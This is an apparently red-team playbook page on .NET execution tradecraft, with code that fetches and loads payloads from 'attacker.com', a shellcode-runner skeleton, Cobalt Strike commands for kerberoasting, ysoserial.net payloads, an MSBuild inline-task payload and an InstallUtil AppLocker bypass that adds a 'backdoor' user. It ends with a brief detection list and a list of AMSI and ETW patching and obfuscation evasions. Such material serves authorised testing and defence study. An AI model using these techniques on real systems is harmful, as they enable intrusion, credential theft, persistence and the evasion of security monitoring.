# .NET Execution Techniques

> **MITRE ATT&CK**: Execution > T1059 - Command and Scripting Interpreter
> **Platforms**: Windows (.NET Framework / .NET Core)
> **Required Privileges**: User (most techniques), Admin (some injection scenarios)
> **OPSEC Risk**: Medium (less monitored than PowerShell, but gaining attention)

---

## Strategic Overview

.NET execution has become the preferred alternative to raw PowerShell for sophisticated Red Teams. The .NET Common Language Runtime (CLR) can be loaded into any process, enabling in-memory execution of compiled assemblies without dropping files to disk. Tools like Cobalt Strike's execute-assembly and SharpSploit have shifted offensive operations toward compiled C# tradecraft. The strategic advantage is that .NET assemblies execute within the hosting process, avoiding the creation of powershell.exe and its associated logging. However, defenders are catching up -- ETW-based .NET assembly load detection and AMSI integration with the CLR (in .NET 4.8+) now provide visibility into these techniques. A Red Team Lead must plan for both legacy and modern .NET detection capabilities.

## Technical Deep-Dive

### Assembly.Load - In-Memory Execution

The core technique for fileless .NET execution. Assemblies are loaded directly from byte arrays.

```csharp
// Load assembly from byte array (no file on disk)
byte[] assemblyBytes = File.ReadAllBytes(@"C:\temp\payload.dll");
Assembly assembly = Assembly.Load(assemblyBytes);

// Download and load from remote source
WebClient wc = new WebClient();
byte[] data = wc.DownloadData("https://attacker.com/payload.dll");
Assembly asm = Assembly.Load(data);
asm.EntryPoint.Invoke(null, new object[] { new string[] { "arg1" } });
```

```powershell
# PowerShell equivalent - load .NET assembly in memory
$bytes = (New-Object Net.WebClient).DownloadData('https://attacker.com/SharpTool.exe')
$asm = [System.Reflection.Assembly]::Load($bytes)
$asm.EntryPoint.Invoke($null, @(,@("--command","execute")))
```

### Reflection-Based Loading

Reflection provides runtime introspection and invocation without compile-time references.

```csharp
// Load and invoke via reflection
Assembly asm = Assembly.Load(assemblyBytes);
Type targetType = asm.GetType("Namespace.ClassName");
MethodInfo method = targetType.GetMethod("Execute", BindingFlags.Public | BindingFlags.Static);
object result = method.Invoke(null, new object[] { "parameter1" });

// Create instance and invoke non-static method
object instance = Activator.CreateInstance(targetType);
targetType.GetMethod("Run").Invoke(instance, null);
```

### Execute-Assembly (Cobalt Strike)

Cobalt Strike's `execute-assembly` loads a .NET assembly into a sacrificial process via an unmanaged CLR host.

```
# Cobalt Strike Beacon
beacon> execute-assembly /path/to/Seatbelt.exe -group=all
beacon> execute-assembly /path/to/SharpHound.exe --CollectionMethod All
beacon> execute-assembly /path/to/Rubeus.exe kerberoast /outfile:hashes.txt
```

The process flow: Fork&Run creates a temporary process (default: rundll32.exe), injects the CLR bootstrap, loads the assembly, captures stdout, and kills the process. Custom configurations use a more appropriate sacrificial process.

### Inline C# Compilation with Add-Type

```powershell
# Compile and execute C# code inline from PowerShell
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr id);
    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr handle, uint ms);
}
"@

# Use the compiled type
$addr = [Win32]::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
```

### Roslyn Compiler Abuse

The Roslyn C# compiler (csc.exe) ships with .NET and can compile arbitrary code.

```bash
# Compile C# source to executable on target
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:payload.exe /target:exe source.cs

# Compile as library
csc.exe /out:payload.dll /target:library source.cs

# Roslyn interactive (csi.exe) - execute C# scripts directly
csi.exe script.csx
```

### AppDomain Isolation

```csharp
// Create isolated AppDomain for execution (can be unloaded to clean up)
AppDomain domain = AppDomain.CreateDomain("PayloadDomain");
domain.ExecuteAssembly("payload.exe", new string[] { "args" });
AppDomain.Unload(domain); // Clean removal of loaded assembly
```

### .NET Deserialization Attacks

```bash
# ysoserial.net - Generate .NET deserialization payloads
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "calc.exe"
ysoserial.exe -g WindowsIdentity -f Json.Net -c "cmd /c whoami > C:\temp\out.txt"
ysoserial.exe -g PSObject -f BinaryFormatter -c "powershell -enc AAAA..."

# Common vulnerable sinks:
# BinaryFormatter.Deserialize(), XmlSerializer, JSON.NET with TypeNameHandling
# LosFormatter, ObjectStateFormatter (ASP.NET ViewState)
```

### MSBuild Inline Tasks

Execute C# code through MSBuild without invoking csc.exe explicitly.

```xml
<!-- payload.csproj -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Execute">
    <ClassicTask />
  </Target>
  <UsingTask TaskName="ClassicTask" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System; using Microsoft.Build.Framework; using Microsoft.Build.Utilities;
        using System.Diagnostics;
        public class ClassicTask : Task {
          public override bool Execute() {
            Process.Start("cmd.exe", "/c whoami > C:\\temp\\out.txt");
            return true;
          }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj
```

### InstallUtil Custom Installer

```csharp
// Payload executes via Uninstall method (bypasses AppLocker default rules)
[System.ComponentModel.RunInstaller(true)]
public class Bypass : Installer {
    public override void Uninstall(IDictionary savedState) {
        // Malicious code here
        Process.Start("cmd.exe", "/c net user backdoor P@ss123! /add");
    }
}
```

```bash
# Execution via InstallUtil (note: /U triggers Uninstall)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
```

## Detection & Evasion

### Detection Mechanisms
- **ETW CLR events**: Microsoft-Windows-DotNETRuntime provider logs assembly loads
- **AMSI for .NET**: .NET 4.8+ integrates AMSI scanning for Assembly.Load
- **.NET assembly load events**: Sysmon Event ID 7 captures DLL/assembly loads
- **Suspicious csc.exe/vbc.exe execution**: Inline compilation generates temp files
- **Process behavioral analysis**: rundll32.exe loading CLR is anomalous

### Evasion Techniques
- Patch AMSI in the CLR before loading assemblies (similar to PowerShell AMSI bypass)
- Patch ETW to disable .NET runtime event emission
- Use D/Invoke instead of P/Invoke to avoid suspicious imports
- Modify execute-assembly to use appropriate sacrificial processes (not rundll32)
- Obfuscate .NET assemblies with ConfuserEx or custom obfuscators
- Use Donut to convert .NET assemblies to position-independent shellcode

## Cross-References

- `03-execution/powershell-execution.md` - PowerShell-based .NET loading
- `03-execution/lolbins.md` - MSBuild and InstallUtil execution details
- `06-defense-evasion/amsi-bypass.md` - AMSI bypass for .NET CLR
- `03-execution/code-injection.md` - Injection of .NET payloads into remote processes

## References

- .NET Assembly.Load Documentation: https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load
- ysoserial.net: https://github.com/pwntester/ysoserial.net
- Cobalt Strike execute-assembly: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide
- SharpSploit: https://github.com/cobbr/SharpSploit
- Donut: https://github.com/TheWover/donut
